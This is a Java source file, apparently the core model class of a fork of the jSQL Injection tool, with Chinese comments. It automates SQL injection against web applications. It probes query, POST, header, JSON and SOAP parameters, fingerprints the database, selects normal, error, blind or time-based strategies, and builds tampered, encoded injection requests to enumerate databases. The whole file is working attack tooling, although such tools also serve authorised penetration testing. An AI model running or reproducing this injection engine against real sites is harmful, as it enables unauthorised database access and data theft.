
package com.jsql.model;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PrivilegedActionException;
import java.util.AbstractMap.SimpleEntry;
import java.util.EnumMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import javax.security.auth.login.LoginException;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.ietf.jgss.GSSException;
import org.json.JSONException;
import org.springframework.stereotype.Component;

import com.jsql.i18n.I18n;
import com.jsql.model.accessible.DataAccess;
import com.jsql.model.accessible.RessourceAccess;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.injection.method.MediatorMethodInjection;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.injection.strategy.MediatorStrategy;
import com.jsql.model.injection.vendor.MediatorVendor;
import com.jsql.model.suspendable.SuspendableGetCharInsertion;
import com.jsql.model.suspendable.SuspendableGetVendor;
import com.jsql.util.AuthenticationUtil;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.ExceptionUtil;
import com.jsql.util.GitUtil;
import com.jsql.util.GitUtil.ShowOnConsole;
import com.jsql.util.HeaderUtil;
import com.jsql.util.JsonUtil;
import com.jsql.util.ParameterUtil;
import com.jsql.util.PreferencesUtil;
import com.jsql.util.PropertiesUtil;
import com.jsql.util.ProxyUtil;
import com.jsql.util.SoapUtil;
import com.jsql.util.ThreadUtil;
import com.jsql.util.tampering.TamperingUtil;

import net.sourceforge.spnego.SpnegoHttpURLConnection;

/**
 * 	用于自动处理SQL注入的MVC模式的模型对象。<br>
 * 	可以将不同的视图附加到这个可视化的对象上，以便分离图形处理的功能性工作。<br>
 * 	该模型指定数据库和策略，运行数据库和策略自动注入以获取数据库、表、列和值。<br>
 *	任务通常在多线程中运行，以加快进程的速度。
 */
@Component
public class InjectionModel extends AbstractModelObservable {
    
    private MediatorVendor mediatorVendor = new MediatorVendor(InjectionModel.this);
    private MediatorMethodInjection mediatorMethodInjection = new MediatorMethodInjection(this);
    private MediatorUtils mediatorUtils;
    private MediatorStrategy mediatorStrategy;
    
    private DataAccess dataAccess = new DataAccess(this);
    private RessourceAccess resourceAccess = new RessourceAccess(this);

    public InjectionModel() {
        this.mediatorUtils = new MediatorUtils();
        
        this.mediatorStrategy = new MediatorStrategy(this);

        this.mediatorUtils.setPropertiesUtil(new PropertiesUtil(this));
        this.mediatorUtils.setConnectionUtil(new ConnectionUtil(this));
        this.mediatorUtils.setAuthenticationUtil(new AuthenticationUtil(this));
        this.mediatorUtils.setGitUtil(new GitUtil(this));
        this.mediatorUtils.setHeaderUtil(new HeaderUtil(this));
        this.mediatorUtils.setParameterUtil(new ParameterUtil(this));
        this.mediatorUtils.setExceptionUtil(new ExceptionUtil(this));
        this.mediatorUtils.setSoapUtil(new SoapUtil(this));
        this.mediatorUtils.setJsonUtil(new JsonUtil(this));
        this.mediatorUtils.setPreferencesUtil(new PreferencesUtil());
        this.mediatorUtils.setProxyUtil(new ProxyUtil(this));
        this.mediatorUtils.setThreadUtil(new ThreadUtil(this));
        this.mediatorUtils.setTamperingUtil(new TamperingUtil());
    }
    
    /**
     * 	发送Log4j日志到视图
     */
    private static final Logger LOGGER = Logger.getRootLogger();
    
    public static final String STAR = "*";
    
    /**
     * 	页面的HTML正文成功响应为多个字段
     * 	 selection (select 1,2,3,..).
     */
    private String srcSuccess = "";
    
    /**
     * 	初始化的URL转换为正确的注入URL。
     */
    private String indexesInUrl = "";

    /**
     * 	数据库版本
     */
    private String versionDatabase;
    
    /**
     * 	选中的数据库
     */
    private String nameDatabase;
    
    /**
     * 	数据库连接用户名
     */
    private String username;
    
    /**
     * 	允许在注入失败后直接开始注入，无需询问用户
     */
    private boolean injectionAlreadyBuilt = false;
    
    private boolean isScanning = false;
    
    public static final boolean IS_PARAM_BY_USER = true;
    public static final boolean IS_JSON = true;

    /**
     * 	重置每个注入属性：数据库元数据，常规线程状态，策略。
     */
    public void resetModel() {
        // TODO make injection pojo for all fields
        this.getMediatorStrategy().getNormal().setVisibleIndex(null);
        this.indexesInUrl = "";
        
        this.getMediatorUtils().getConnectionUtil().setTokenCsrf(null);
        
        this.versionDatabase = null;
        this.nameDatabase = null;
        this.username = null;
        
        this.setIsStoppedByUser(false);
        this.injectionAlreadyBuilt = false;
        
        this.getMediatorStrategy().setStrategy(null);
        
        this.resourceAccess.setReadingIsAllowed(false);
        
        this.getMediatorUtils().getThreadUtil().reset();
    }

    /**
     *	准备注入过程，可以被中断
     *	清除最终在先前注入过程中定义的所有属性。
     *	通过扫描，标准和TU运行。
     */
    public void beginInjection() {
        this.resetModel();
        
        try {
            if (!this.getMediatorUtils().getProxyUtil().isLive(ShowOnConsole.YES)) {
                return;
            }
            
            LOGGER.info(I18n.valueByKey("LOG_START_INJECTION") +": "+ this.getMediatorUtils().getConnectionUtil().getUrlByUser());
            
            // 检查参数的完整性
            this.getMediatorUtils().getParameterUtil().checkParametersFormat();
            
            // 检查连接是否正常：定义Cookie管理，检查HTTP状态，解析<form>参数，处理CSRF
            LOGGER.trace(I18n.valueByKey("LOG_CONNECTION_TEST"));
            this.getMediatorUtils().getConnectionUtil().testConnection();
            
            boolean hasFoundInjection = false;
            
            hasFoundInjection = this.testParameters(this.getMediatorMethodInjection().getQuery());

            if (!hasFoundInjection) {
                hasFoundInjection = this.getMediatorUtils().getSoapUtil().testParameters();
            }
            
            if (!hasFoundInjection) {
                LOGGER.trace("请检查标准的请求参数");
                hasFoundInjection = this.testParameters(this.getMediatorMethodInjection().getRequest());
            }
            
            if (!hasFoundInjection) {
                hasFoundInjection = this.testParameters(this.getMediatorMethodInjection().getHeader());
            }
            
            if (!this.isScanning) {
                if (!this.getMediatorUtils().getPreferencesUtil().isNotInjectingMetadata()) {
                    this.getDataAccess().getDatabaseInfos();
                }
                this.getDataAccess().listDatabases();
            }
            
            LOGGER.trace(I18n.valueByKey("LOG_DONE"));
            
            this.injectionAlreadyBuilt = true;
        } catch (JSqlException e) {
            LOGGER.warn(e.getMessage(), e);
        } finally {
//            Request request = new Request();
//            request.setMessage(Interaction.END_PREPARATION);
//            this.sendToViews(request);
        }
    }
    
    /**
     *	使用3种模式验证进样是否适用于特定方法：标准（最后一个参数），进样点和完整的参数注入。 检查特殊注入，例如JSON和SOAP。
     * @param methodInjection 当前已测试(Query, Request or Header)
     * @return 如果注入没有失败则为true
     * @throws JSqlException 当没有参数的完整性，用户停止过程或注入失败时，抛出异常
     */
    public boolean testParameters(MethodInjection methodInjection) throws JSqlException {
        boolean hasFoundInjection = false;
        
        // 仅当用户测试用户选择的每个参数或方法时，才注入URL，请求或标头参数
        if (!this.getMediatorUtils().getPreferencesUtil().isCheckingAllParam()
            && this.getMediatorUtils().getConnectionUtil().getMethodInjection() != methodInjection) {
            return hasFoundInjection;
        }
        
        // 注入到当前运行的方法种
        this.getMediatorUtils().getConnectionUtil().setMethodInjection(methodInjection);
        
        // 通过注入点注入
        if (methodInjection.getParamsAsString().contains(InjectionModel.STAR)) {
            LOGGER.info("Checking single "+ methodInjection.name() +" parameter with injection point at *");
            
            // 将保持参数值不变
            // 参数为null时，不测试插入字符
            hasFoundInjection = this.testStrategies(!InjectionModel.IS_PARAM_BY_USER, !InjectionModel.IS_JSON, null);
        
        // 默认注入：仅测试最后一个参数
        } else if (!methodInjection.isCheckingAllParam()) {
            // 在最后一个参数上定义的注入点
            methodInjection.getParams().stream().reduce((a, b) -> b).ifPresent(e -> e.setValue(e.getValue() + InjectionModel.STAR));

            // 将由用户检查参数值。
            // 注意，必须同时选中选项"注入每个URL参数"和"注入JSON"用于最后参数的JSON注入
            hasFoundInjection = this.testStrategies(InjectionModel.IS_PARAM_BY_USER, !InjectionModel.IS_JSON, methodInjection.getParams().stream().reduce((a, b) -> b).orElseThrow(NullPointerException::new));
            
        // 注入每个参数：isCheckingAllParam（）== true。
        // 在两个循环中一对一地测试参数：
        //  - 内循环从上一个参数中删除*
        //  - 外循环将*添加到当前参数
        } else {
            
            // 如果找到了注入，则该参数将以*标记，否则内循环将删除标记*
            injectionSuccessful:
            for (SimpleEntry<String, String> paramBase: methodInjection.getParams()) {

                // 此参数是当前测试的参数。
                // 对于JSON值属性，要一一遍历以测试每个值。
                // 对于标准值，标记*只需添加到其值的末尾。
                for (SimpleEntry<String, String> paramStar: methodInjection.getParams()) {
                    
                    if (paramStar == paramBase) {
                        try {
                            // 将测试当前值是否为JSON实体
                            Object jsonEntity = JsonUtil.getJson(paramStar.getValue());
                            
                            // 定义以路径为键的JSON属性树：root.a => a的值
                            List<SimpleEntry<String, String>> attributesJson = JsonUtil.createEntries(jsonEntity, "root", null);
                            
                            // 选择选项'注入JSON'并且存在要注入的JSON实体时
                            // 然后遍历每条路径，在值的末尾添加*并测试每种策略。
                            // 每次测试之间标记*被删除
                            if (this.getMediatorUtils().getPreferencesUtil().isCheckingAllJSONParam() && !attributesJson.isEmpty()) {
                                hasFoundInjection = this.getMediatorUtils().getJsonUtil().testJsonParameter(methodInjection, paramStar);
                                
                            // 标准非JSON注入
                            } else {
                                hasFoundInjection = this.getMediatorUtils().getJsonUtil().testStandardParameter(methodInjection, paramStar);
                            }
                            
                            if (hasFoundInjection) {
                                break injectionSuccessful;
                            }
                        } catch (JSONException e) {
                            LOGGER.error("解析JSON参数时出错!", e);
                        }
                        
                    }
                }
                
            }
        }
        
        return hasFoundInjection;
    }
    
    /**
     * 	找到插入字符，测试每种策略，注入元数据并列出数据库。
     * @param isParamByUser 如果为标准/ JSON /完全模式，则为true；如果为注入点，则为false
     * @param isJson 如果参数包含JSON，则为true
     * @param parameter 测试参数
     * @return 当注入成功时 返回true
     * @throws JSqlException	当没有完整的参数，用户停止过程或注入失败时
     */
    public boolean testStrategies(boolean isParamByUser, boolean isJson, SimpleEntry<String, String> parameter) throws JSqlException {
        
        // Define insertionCharacter, i.e, -1 in "[..].php?id=-1 union select[..]",
        LOGGER.trace("获取插入字符");
        
        // 测试参数完整性
        String characterInsertionByUser = this.getMediatorUtils().getParameterUtil().getCharacterInsertion(isParamByUser, parameter);
        
        // 如果不是注入点，则找到插入字符。
        //如果没有插入字符有效且用户返回空值，则强制为1，
        //如果没有插入字符，则强制使用用户的值，
        //否则强制插入字符。
        if (parameter != null) {
            String charInsertion = new SuspendableGetCharInsertion(this).run(characterInsertionByUser, parameter, isJson);
            LOGGER.info(I18n.valueByKey("LOG_USING_INSERTION_CHARACTER") +" ["+ charInsertion.replace(InjectionModel.STAR, "") +"]");
        }
        
        // Fingerprint database
        this.getMediatorVendor().setVendor(new SuspendableGetVendor(this).run());

        // 测试每种注射策略：时间<盲注<错误<正常
        //选择最有效的策略：正常>错误>盲注>时间
        this.getMediatorStrategy().getTime().checkApplicability();
        this.getMediatorStrategy().getBlind().checkApplicability();
        this.getMediatorStrategy().getError().checkApplicability();
        this.getMediatorStrategy().getNormal().checkApplicability();

        // 选择最有效的策略：正常>错误>盲注>时间
        if (this.getMediatorStrategy().getNormal().isApplicable()) {
            this.getMediatorStrategy().getNormal().activateStrategy();
            
        } else if (this.getMediatorStrategy().getError().isApplicable()) {
            this.getMediatorStrategy().getError().activateStrategy();
            
        } else if (this.getMediatorStrategy().getBlind().isApplicable()) {
            this.getMediatorStrategy().getBlind().activateStrategy();
            
        } else if (this.getMediatorStrategy().getTime().isApplicable()) {
            this.getMediatorStrategy().getTime().activateStrategy();
            
        } else {
        	Request updateInjectionStatus = new Request();
        	updateInjectionStatus.setMessage(Interaction.SET_NO_INJECTION_STATUS_DB);
        	updateInjectionStatus.setParameters(this.getMediatorUtils().getConnectionUtil().getUrlByUser());
            this.sendToViews(updateInjectionStatus);
            throw new InjectionFailureException("没有发现注入漏洞！");
        }
        
        return true;
    }
    
    /**
     * 	运行与Web服务器的HTTP连接。
     * @param dataInjection SQL query
     * @param responseHeader unused
     * @return source code of current page
     */
    @Override
    public String inject(String newDataInjection, boolean isUsingIndex) {
        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlInjection = this.getMediatorUtils().getConnectionUtil().getUrlBase();
        
        String dataInjection = " "+ newDataInjection;
        
        urlInjection = this.buildURL(urlInjection, isUsingIndex, dataInjection);
        
        // TODO merge into function
        urlInjection = urlInjection
            .trim()
            // Remove comments
            .replaceAll("(?s)/\\*.*?\\*/", "")
            // Remove spaces after a word
            .replaceAll("([^\\s\\w])(\\s+)", "$1")
            // Remove spaces before a word
            .replaceAll("(\\s+)([^\\s\\w])", "$2")
            // Replace spaces
            .replaceAll("\\s+", "+");

        URL urlObject = null;
        try {
            urlObject = new URL(urlInjection);
        } catch (MalformedURLException e) {
            LOGGER.warn("查询的 Url格式错误: "+ e.getMessage(), e);
            return "";
        }

        /**
         * 	创建GET查询字串信息
         * TODO separate method
         */
        if (!this.getMediatorUtils().getParameterUtil().getQueryString().isEmpty()) {
            // 没有查询字符串（如Request和Header）的URL可以从<form>解析中接收新的参数，在这种情况下，请添加"？" 到URL
            if (!urlInjection.contains("?")) {
                urlInjection += "?";
            }

            urlInjection += this.buildQuery(this.getMediatorMethodInjection().getQuery(), this.getMediatorUtils().getParameterUtil().getQueryStringFromEntries(), isUsingIndex, dataInjection);
            
            if (this.getMediatorUtils().getConnectionUtil().getTokenCsrf() != null) {
                urlInjection += "&"+ this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getKey() +"="+ this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getValue();
            }
            
            try {
                urlObject = new URL(urlInjection);
            } catch (MalformedURLException e) {
                LOGGER.warn("Url格式错误: "+ e.getMessage(), e);
            }
        } else {
            if (this.getMediatorUtils().getConnectionUtil().getTokenCsrf() != null) {
                urlInjection += "?"+ this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getKey() +"="+ this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getValue();
            }
        }
        
        HttpURLConnection connection;
        String pageSource = "";
        
        // 定义连接
        try {
            
            // 打开连接
            if (this.getMediatorUtils().getAuthenticationUtil().isKerberos()) {
                String kerberosConfiguration = Pattern
                        .compile("(?s)\\{.*")
                        .matcher(StringUtils.join(Files.readAllLines(Paths.get(this.getMediatorUtils().getAuthenticationUtil().getPathKerberosLogin()), Charset.defaultCharset()), ""))
                        .replaceAll("")
                        .trim();
                
                SpnegoHttpURLConnection spnego = new SpnegoHttpURLConnection(kerberosConfiguration);
                connection = spnego.connect(urlObject);
            } else {
                connection = (HttpURLConnection) urlObject.openConnection();
            }
            
            connection.setReadTimeout(this.getMediatorUtils().getConnectionUtil().getTimeout());
            connection.setConnectTimeout(this.getMediatorUtils().getConnectionUtil().getTimeout());
            connection.setDefaultUseCaches(false);
            
            connection.setRequestProperty("Pragma", "no-cache");
            connection.setRequestProperty("Cache-Control", "no-cache");
            connection.setRequestProperty("Expires", "-1");
            connection.setRequestProperty("Content-Type", "text/plain");
            
            // Csrf
            
            if (this.getMediatorUtils().getConnectionUtil().getTokenCsrf() != null) {
                connection.setRequestProperty(this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getKey(), this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getValue());
            }
            
            this.getMediatorUtils().getConnectionUtil().fixJcifsTimeout(connection);

            Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
            msgHeader.put(Header.URL, urlInjection);
            
            /**
             * 创建HEADER和日志信息
             */
            if (!this.getMediatorUtils().getParameterUtil().getHeader().isEmpty()) {
                Stream.of(this.buildQuery(this.getMediatorMethodInjection().getHeader(), this.getMediatorUtils().getParameterUtil().getHeaderFromEntries(), isUsingIndex, dataInjection).split("\\\\r\\\\n"))
                .forEach(e -> {
                    if (e.split(":").length == 2) {
                        HeaderUtil.sanitizeHeaders(connection, new SimpleEntry<>(e.split(":")[0], e.split(":")[1]));
                    }
                });
                
                msgHeader.put(Header.HEADER, this.buildQuery(this.getMediatorMethodInjection().getHeader(), this.getMediatorUtils().getParameterUtil().getHeaderFromEntries(), isUsingIndex, dataInjection));
            }
    
            /**
             * 创建 POST和日志信息
             */
            if (!this.getMediatorUtils().getParameterUtil().getRequest().isEmpty() || this.getMediatorUtils().getConnectionUtil().getTokenCsrf() != null) {
                try {
                    ConnectionUtil.fixCustomRequestMethod(connection, this.getMediatorUtils().getConnectionUtil().getTypeRequest());
                    
                    connection.setDoOutput(true);
                    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
    
                    DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                    if (this.getMediatorUtils().getConnectionUtil().getTokenCsrf() != null) {
                        dataOut.writeBytes(this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getKey() +"="+ this.getMediatorUtils().getConnectionUtil().getTokenCsrf().getValue() +"&");
                    }
                    if (this.getMediatorUtils().getConnectionUtil().getTypeRequest().matches("PUT|POST")) {
                        if (this.getMediatorUtils().getParameterUtil().isRequestSoap()) {
                            dataOut.writeBytes(this.buildQuery(this.getMediatorMethodInjection().getRequest(), this.getMediatorUtils().getParameterUtil().getRawRequest(), isUsingIndex, dataInjection));
                        } else {
                            dataOut.writeBytes(this.buildQuery(this.getMediatorMethodInjection().getRequest(), this.getMediatorUtils().getParameterUtil().getRequestFromEntries(), isUsingIndex, dataInjection));
                        }
                    }
                    dataOut.flush();
                    dataOut.close();
                    
                    if (this.getMediatorUtils().getParameterUtil().isRequestSoap()) {
                        msgHeader.put(Header.POST, this.buildQuery(this.getMediatorMethodInjection().getRequest(), this.getMediatorUtils().getParameterUtil().getRawRequest(), isUsingIndex, dataInjection));
                    } else {
                        msgHeader.put(Header.POST, this.buildQuery(this.getMediatorMethodInjection().getRequest(), this.getMediatorUtils().getParameterUtil().getRequestFromEntries(), isUsingIndex, dataInjection));
                    }
                } catch (IOException e) {
                    LOGGER.warn("Error during Request connection: "+ e.getMessage(), e);
                }
            }
            
            msgHeader.put(Header.RESPONSE, HeaderUtil.getHttpHeaders(connection));
            
            try {
                pageSource = ConnectionUtil.getSource(connection);
            } catch (Exception e) {
                LOGGER.error(e, e);
            }
            
            // 这里会有很多的请求所以不需要要调用 connection.disconnect() 
            
            msgHeader.put(Header.SOURCE, pageSource);
            msgHeader.put(Header.CASE,newDataInjection);
            
            // 通知视图有关日志信息
            Request request = new Request();
            request.setMessage(Interaction.MESSAGE_HEADER);
            request.setParameters(msgHeader);
            this.sendToViews(request);
            
        } catch (
            // General和Spnego连接的异常
            IOException | LoginException | GSSException | PrivilegedActionException e
        ) {
            LOGGER.warn("Error during connection: "+ e.getMessage(), e);
        }

        return pageSource;
    }
    
    /**
     * 	创建GET，POST，HEADER数据。<br>
     * Each can be:<br>
     *  - 原始数据（无注入）<br>
     *  - 没有索引要求的SQL查询<br>
     *  - 具有索引要求的SQL查询。
     * @param dataType 当前的构建方法
     * @param urlBase 请求数据的开始
     * @param isUsingIndex 如果请求不使用索引，则为False
     * @param sqlTrail SQL语句
     * @return Final data
     */
    private String buildURL(String urlBase, boolean isUsingIndex, String sqlTrail) {
        if (urlBase.contains(InjectionModel.STAR)) {
            if (!isUsingIndex) {
                return urlBase.replace(InjectionModel.STAR, sqlTrail);
            } else {
                return
                    urlBase.replace(
                        InjectionModel.STAR,
                        this.indexesInUrl.replaceAll(
                            "1337" + this.getMediatorStrategy().getNormal().getVisibleIndex() + "7331",
                            /**
                             * Oracle列通常包含$，这是为正则表达式保留的，需要使用quoteReplacement（）进行转义
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        }
        return urlBase;
    }
    
    private String buildQuery(MethodInjection methodInjection, String paramLead, boolean isUsingIndex, String sqlTrail) {
        String query;
        
        paramLead = paramLead.replace("*", "SlQqLs*lSqQsL");
        
        // TODO simplify
        if (
            // 如果用户未选择方法，则不进行参数转换
            this.getMediatorUtils().getConnectionUtil().getMethodInjection() != methodInjection
            // URL中的注入点时不进行参数转换
            || this.getMediatorUtils().getConnectionUtil().getUrlBase().contains(InjectionModel.STAR)
        ) {
            // 只需传递参数，无需任何转换
            query = paramLead;
            
        } else if (
                
            // 如果用户选择了方法，并且URL不包含注入点，但参数包含一个注入点，用这些参数中的SQL表达式替换注入点
            paramLead.contains(InjectionModel.STAR)
        ) {
            // 几个SQL表达式在SELECT中不使用索引，如Boolean，Error，Shell并搜索插入字符，在这种情况下，用SQL表达式替换注入点。
            if (!isUsingIndex) {
                query = paramLead.replace(InjectionModel.STAR, sqlTrail + this.getMediatorVendor().getVendor().instance().endingComment());
                
            } else {
                
            	//用为常规策略找到的索引替换注入点并使用可见索引进行注入
                query = paramLead.replace(
                    InjectionModel.STAR,
                    this.indexesInUrl.replaceAll(
                        "1337" + this.getMediatorStrategy().getNormal().getVisibleIndex() + "7331",
                        /**
                         * * Oracle列通常包含$，这是为正则表达式保留的，需要使用quoteReplacement（）进行转义
                         */
                        Matcher.quoteReplacement(sqlTrail)
                    ) + this.getMediatorVendor().getVendor().instance().endingComment()
                );
            }
            
        } else {
            // 方法由用户选择，没有注射点
            if (
                // 几个SQL表达式在SELECT中不使用索引，如Boolean，Error，Shell并搜索插入字符，在这种情况下，将concat SQL表达式连接到param的末尾。
                !isUsingIndex
            ) {
                query = paramLead + sqlTrail;
                
                // 按数据库添加结尾行注释
                query = query + this.getMediatorVendor().getVendor().instance().endingComment();
                
            } else {
                //为常规策略找到参数的Concat索引，并使用可见索引进行注入
                query = paramLead + this.indexesInUrl.replaceAll(
                    "1337" + this.getMediatorStrategy().getNormal().getVisibleIndex() + "7331",
                    /**
                     * Oracle列通常包含$，这是为正则表达式保留的,需要使用quoteReplacement（）进行转义
                     */
                    Matcher.quoteReplacement(sqlTrail)
                );
                
                // 按数据库类型添加结尾行注释
                query = query + this.getMediatorVendor().getVendor().instance().endingComment();
            }
        }
        
        // TODO merge into function
        
        // 删除SQL注释
        query = query.replaceAll("(?s)/\\*.*?\\*/", "");
        
        if (
            methodInjection == this.getMediatorMethodInjection().getRequest()
            && this.getMediatorUtils().getParameterUtil().isRequestSoap()
        ) {
            query = query.replace("%2b", "+");
        } else {
            // 删除字符串后空格
            query = query.replaceAll("([^\\s\\w])(\\s+)", "$1");
            
            // 删除字符串前空格
            query = query.replaceAll("(\\s+)([^\\s\\w])", "$2");
            
            // 替换空格
            query = query.replaceAll("\\s+", "+");
        }
        
        if (this.getMediatorUtils().getConnectionUtil().getMethodInjection() == methodInjection) {
            query = this.getMediatorUtils().getTamperingUtil().tamper(query);
        }
        
        if (methodInjection != this.getMediatorMethodInjection().getHeader()) {
            // URL编码每个字符，因为没有查询参数上下文
            query = query.replace("`", "%60");
            query = query.replace("|", "%7C");
            query = query.replace("'", "%27");
            query = query.replace("(", "%28");
            query = query.replace(")", "%29");
            query = query.replace("?", "%3F");
            query = query.replace(">", "%3E");
            query = query.replace(" ", "+");
            query = query.replace("\"", "%22");
            query = query.replace("{", "%7B");
            query = query.replace("}", "%7D");
            query = query.replace("[", "%5B");
            query = query.replace("]", "%5D");
        } else {
            // 替换空格
            query = query.replace("+", "%20");
            query = query.replace(",", "%2C");
        }
        
        query = query.trim();
        
        return query;
    }
    
    /**
     * 在控制台中显示源代码
     * @param message 错误信息
     * @param 源文本显示在控制台中
     */
    public void sendResponseFromSite(String message, String source) {
        LOGGER.warn(message + ", response from site:");
        LOGGER.warn(">>>" + source);
    }

    /**
     * 将每个参数从GUI发送到模型，以便开始准备注入，注入过程是通过模型函数inputValidation（）在新线程中启动
     */
    public void controlInput(String urlQuery,String dataRequest,String dataHeader,
        MethodInjection methodInjection,String typeRequest,boolean isScanning) {
        try {
            //正则表达式判断链接格式是否正确
            if (!urlQuery.isEmpty() && !urlQuery.matches("(?i)^https?://.*")) {
                if (!urlQuery.matches("(?i)^\\w+://.*")) {
                    LOGGER.info("Undefined URL protocol, forcing to [http://]");
                    urlQuery = "http://"+ urlQuery;
                } else {
                    throw new MalformedURLException("unknown URL protocol");
                }
            }
                     
            this.getMediatorUtils().getParameterUtil().initQueryString(urlQuery);
            this.getMediatorUtils().getParameterUtil().initRequest(dataRequest);
            this.getMediatorUtils().getParameterUtil().initHeader(dataHeader);
            
            this.getMediatorUtils().getConnectionUtil().setMethodInjection(methodInjection);
            this.getMediatorUtils().getConnectionUtil().setTypeRequest(typeRequest);
            
            if (isScanning) {
                this.beginInjection();
            } else {
                // 在线程中启动模型注入过程
                new Thread(InjectionModel.this::beginInjection, "ThreadBeginInjection").start();
            }
        } catch (MalformedURLException e) {
            LOGGER.warn("无效链接: "+ e.getMessage(), e);
            
            // URL不正确，重置开始按钮
            Request request = new Request();
            request.setMessage(Interaction.END_PREPARATION);
            this.sendToViews(request);
        }
    }
    
    /**
     * 显示系统环境信息
     */
    public void displayVersion() {
        String versionJava = System.getProperty("java.version");//Java版本
        String nameSystemArchitecture = System.getProperty("os.arch");//操作系统版本
        LOGGER.trace(
            "sql_injectino v" + this.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("sql_injection.version")
            + " on Java "+ versionJava
            +"-"+ nameSystemArchitecture
        );
    }
    
    public String getDatabaseInfos() {
        return
            "Database ["+ this.nameDatabase +"] "
            + "on "+ this.getMediatorVendor().getVendor() +" ["+ this.versionDatabase +"] "
            + "for user ["+ this.username +"]";
    }

    public void setDatabaseInfos(String versionDatabase, String nameDatabase, String username) {
        this.versionDatabase = versionDatabase;
        this.nameDatabase = nameDatabase;
        this.username = username;
    }
    
    // Getters and setters

    public String getSrcSuccess() {
        return this.srcSuccess;
    }

    public void setSrcSuccess(String srcSuccess) {
        this.srcSuccess = srcSuccess;
    }

    public String getIndexesInUrl() {
        return this.indexesInUrl;
    }

    public void setIndexesInUrl(String indexesInUrl) {
        this.indexesInUrl = indexesInUrl;
    }

    public boolean isInjectionAlreadyBuilt() {
        return this.injectionAlreadyBuilt;
    }

    public void setIsScanning(boolean isScanning) {
        this.isScanning = isScanning;
    }

    public String getVersionJsql() {
        return this.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("sql_injection.version");
    }

    public MediatorUtils getMediatorUtils() {
        return this.mediatorUtils;
    }

    public MediatorVendor getMediatorVendor() {
        return this.mediatorVendor;
    }

    public MediatorMethodInjection getMediatorMethodInjection() {
        return this.mediatorMethodInjection;
    }

    public DataAccess getDataAccess() {
        return this.dataAccess;
    }

    public RessourceAccess getResourceAccess() {
        return this.resourceAccess;
    }

    public MediatorStrategy getMediatorStrategy() {
        return this.mediatorStrategy;
    }

}
